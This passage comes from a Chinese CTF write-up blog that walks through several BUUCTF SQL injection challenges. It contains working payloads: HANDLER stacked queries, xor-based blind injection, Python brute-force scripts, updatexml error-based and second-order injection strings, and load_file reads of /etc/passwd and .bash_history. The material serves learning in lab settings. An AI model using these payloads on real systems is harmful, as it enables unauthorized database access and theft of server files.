src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725230626425.png" alt="image-20210725230626425"></p><p>flag应该就在flaghere这个表里</p><p>看一下列名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231110024.png" alt="image-20210725231110024"></p><p>想查看的时候发现存在过滤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231208544.png" alt="image-20210725231208544"></p><p>这里可以利用headler</p><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><p>最终payload：1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p><p>1&#39;;handler score open;handler score read first;handler score close;#</p><p>（试了一下利用headler强网杯的那道也能注出来</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231720309.png" alt="image-20210725231720309"></p><p><strong>关于handler命令</strong><br>转载自:<a href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p><p>基本语法：</p><pre class="language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE</code></pre><p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tbl_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p><p>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</p><p>如果我们不想浏览一个表的所有行，可以使用where和limit子句。</p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>盲注，注入点在id</p><p>可以利用异或来进行盲注</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906123555686.png" alt="image-20210906123555686"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906123751187.png" alt="image-20210906123751187"></p><p>找个脚本直接爆破，学一下这个脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport sysimport timedef get_DBlen(url):    for i in range(1,10):        db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i        r &#x3D; requests.get(db_url)        if &quot;Click&quot; in r.text:            print(&quot;数据库名称的长度为:%d&quot;%i)            return idef get_DBname(url,length):    DBname &#x3D; &quot;&quot;    length &#x3D; length + 1    for i in range(1,length):        Max &#x3D; 122        Min &#x3D; 41        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2        while Min &lt;&#x3D; Max:            # 爆表名            db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            r &#x3D; requests.get(db_url)            if &quot;Click&quot; in r.text:                Min&#x3D;Mid+1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            else:                Max &#x3D; Mid-1                Mid &#x3D; (Min+Max)&#x2F;&#x2F;2                pass            pass        DBname &#x3D; DBname + chr(Mid)    print(DBname)    return DBnamedef get_TBname(url):    name&#x3D;&quot;&quot;    i &#x3D; 0    while True:        i &#x3D; i+1        Max &#x3D; 128        Min &#x3D; 32        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2        while Min &lt;&#x3D; Max:            # 爆表名            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            # 爆字段名            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            # 获取flag            db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid)            r &#x3D; requests.get(db_url)            if &quot;Click&quot; in r.text:                Min&#x3D;Mid+1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            else:                Max&#x3D;Mid-1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            pass        name&#x3D;name+chr(Mid)        print(name)        if Mid &#x3D;&#x3D; 31:            break        time.sleep(0.5)  if __name__&#x3D;&#x3D;&quot;__main__&quot;:    url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot;    db_Len &#x3D; get_DBlen(url)    db_Name &#x3D; get_DBname(url,db_Len)    tb_name &#x3D; get_TBname(url)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906151816679.png" alt="image-20210906151816679"></p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>第一次遇见二次注入的题，正好学一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211026234512946.png" alt="image-20211026234512946"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211026234523294.png" alt="image-20211026234523294"></p><p>源码里有个file，猜测有文件包含，可以利用伪协议读取这几个页面的源码</p><p>change.php页面</p><pre class="language-sql" data-language="sql"><code class="language-sql">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg &#x3D; &#39;&#39;;    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;    $user_name &#x3D; $_POST[&quot;user_name&quot;];    $address &#x3D; addslashes($_POST[&quot;address&quot;]);    $phone &#x3D; $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg &#x3D; &#39;no sql inject!&#39;;    &#125;else&#123;        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;        $fetch &#x3D; $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row &#x3D; $fetch-&gt;fetch_assoc();        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];        $result &#x3D; $db-&gt;query($sql);        if(!$result) &#123;            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        &#125;        $msg &#x3D; &quot;订单修改成功&quot;;    &#125; else &#123;        $msg &#x3D; &quot;未找到订单!&quot;;    &#125;&#125;else &#123;    $msg &#x3D; &quot;信息不全&quot;;&#125;</code></pre><p>主要的漏洞点就在change.php</p><p>因为其他输入位置过滤的太多，基本能注入的都被过滤了，所以只能利用address</p><p>在创建address时虽然对输入的数据进行了addslashes过滤</p><p>但之后还会对旧address进行一次sql查询</p><p>因此可以利用二次注入，再结合报错注入，和load_file函数读取flag文件</p><p>在创建时在地址中输入注入语句</p><p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</p><p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)#</p><p>（这里之所以要看flag.txt根据师傅们的博客推测是纯靠猜的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211027000523555.png" alt="image-20211027000523555"></p><p>在修改地址的时候就会重新调用这个sql语句，报错输出flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211027000543438.png" alt="image-20211027000543438"></p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>这也是个二次注入</p><p>注册后登录再修改密码</p><p>利用报错注入</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028162141941.png" alt="image-20211028162141941"></p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028162259138.png" alt="image-20211028162259138"></p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))#</p><p>离谱，被骗了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028163357632.png" alt="image-20211028163357632"></p><p>重新查表</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028170524356.png" alt="image-20211028170524356"></p><p>这一看就是没输出全</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028170804487.png" alt="image-20211028170804487"></p><p>？？？</p><p>这个字段里加了一堆没用的数据</p><p>只能用正则regexp过滤一下</p><p>ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028171620967.png" alt="image-20211028171620967"></p><p>还是没输出全</p><p>之后就要用逆序输出了</p><pre class="language-txt" data-language="txt"><code class="language-txt">ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028171750860.png" alt="image-20211028171750860"></p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>有git泄露，用githack跑一遍，然后利用git log --reflog查看历史提交，再利用git reset回滚版本，得到原始的代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;    header(&quot;Location: .&#x2F;login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category &#x3D; addslashes($_POST[&#39;category&#39;]);    $title &#x3D; addslashes($_POST[&#39;title&#39;]);    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into board            set category &#x3D; &#39;$category&#39;,                title &#x3D; &#39;$title&#39;,                content &#x3D; &#39;$content&#39;&quot;;    $result &#x3D; mysql_query($sql);    header(&quot;Location: .&#x2F;index.php&quot;);    break;case &#39;comment&#39;:    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    $num &#x3D; mysql_num_rows($result);    if($num&gt;0)&#123;    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    &#125;    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);    break;default:    header(&quot;Location: .&#x2F;index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: .&#x2F;index.php&quot;);&#125;?&gt;</code></pre><p>输入的内容都被addslashes过滤了，但是在comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入</p><p>在发帖部分：的category里输入x&#39;,content=database(),/*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213616672.png" alt="image-20211117213616672"></p><p>再在提交留言里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213710038.png" alt="image-20211117213710038"></p><p>这样可以形成多行注释，注释掉原有的content字段</p><p>可以得到数据库名称</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213738173.png" alt="image-20211117213738173"></p><p>这时查询语句为</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment        set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;,            content &#x3D; &#39;*&#x2F;#&#39;,            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>即</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment        set category &#x3D; &#39;x&#39;,content&#x3D;database(),            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p><strong>SQL读取文件</strong><br>用load_file()函数进行读取，值得注意的是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p><p><strong>.bash_history</strong></p><p>在unix/linux系统下保存历史命令的文件，在用户的根目录下，即<code>~/</code>处。</p><p><strong>.DS_Store文件泄露</strong></p><p>文件泄露，有一个下载至本地的<a href="https://github.com/lijiejie/ds_store_exp">脚本</a>，不过这题用不上。</p><p>在发帖之前还有个登录界面，用户名和密码前几位直接给了，剩下三位爆破得到666</p><p>&#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214221610.png" alt="image-20211117214221610"></p><p>这一步应该是为了知道.bash_histroy文件的路径</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214325543.png" alt="image-20211117214325543"></p><p> &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214355622.png" alt="image-20211117214355622"></p><p>我们看到进行了一个解压然后复制和删除的操作，而.DS_Store只在/var/www/html/目录下被删除了，/tmp/html目录下依然存在</p><p>接着再查.DS_Store</p><p> &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</p><p>为了使其全部显示，要用hex编码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214600582.png" alt="image-20211117214600582"></p><p>然后解码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214639450.png" alt="image-20211117214639450"></p><p>看见有个flag文件</p><p>读一下</p><p>&#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214713821.png" alt="image-20211117214713821"></p><p>再解码，拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214747130.png" alt="image-20211117214747130"></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>or被过滤了，没法用information查表了，但是可以用</p><pre class="language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;1032||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()</code></pre><p>正确的时候返回Nu1L，错误时返回V&amp;N</p><p>爆表脚本</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot;payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;database&#x3D; &#39;&#39;for i in range(1,1000):low &#x3D; 32heigh &#x3D; 128mid &#x3D; (low + heigh) &#x2F;&#x2F; 2while (low &lt; heigh):payload1 &#x3D; payload.format(i,mid)post_data &#x3D; &#123;&#39;id&#39;: payload1&#125;r &#x3D; requests.post(url,data&#x3D;post_data)print(payload1)if &quot;Nu1L&quot; in r.text:low &#x3D; mid + 1else:heigh &#x3D; midmid &#x3D; (low + heigh) &#x2F;&#x2F; 2if mid &#x3D;&#x3D; 32:breakdatabase +&#x3D;chr(mid)print(database)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123202113511.png" alt="image-20211123202113511"></p><p>得到表名后，拿不到列名，这里可以用无列名注入</p><p>先贴payload</p><p>2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</p><p>采用了字符偏移</p><ul><li><p>按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符</p></li><li><p>所以最后的mid要减一才是正确的字符</p></li><li><p>这里我们传入十六进制，mysql会自动将十六进制转为字符</p></li><li><p>mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 </p></li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123202924585.png" alt="image-20211123202924585"></p><p>这里要和flag的表的列数一样</p><p>最后跑一下拿flag</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot;#payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;change &#x3D; &#39;&#39;database&#x3D; &#39;&#39;for j in range(1,100):for i in range(32,128):change &#x3D; database+chr(i)payload1 &#x3D; payload.format(change)print(payload1)data &#x3D; &#123;&#39;id&#39;: payload1&#125;r &#x3D; requests.post(url,data&#x3D;data)if &#39;Nu1L&#39; in r.text:database +&#x3D; chr(i-1)print(database)break</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123205558046.png" alt="image-20211123205558046"></p><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>进入题目之后点击网页的几个按钮连个跳转都没有，遇事不决抓个包看看</p><p>看到有个search参数，这里存在sql注入</p><p>先用order by探一下列数，然后直接联合注入</p><p>注表名：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408103158993.png" alt="image-20220408103158993"></p><p>但是这里并没有什么可以的表，猜测是不是有其他库，重新去看一下库名</p><p>这里用database()只能看到一个aliens库，因为database()只能看到当前库，下次记得一定要把所有库都查出来</p><p>用<code>union+select+1,group_concat(schema_name)+from+information_schema.schemata</code>这个语句可以注出另外两个库<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104227983.png" alt="image-20220408104227983"></p><p>看一下alien_code库</p><pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;&#39;alien_code&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104425032.png" alt="image-20220408104425032"></p><p>再看看code表</p><pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name&#x3D;&#39;code&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104548291.png" alt="image-20220408104548291"></p><p>爆字段</p><pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(id,code)+from+alien_code.code</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104808831.png" alt="image-20220408104808831"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
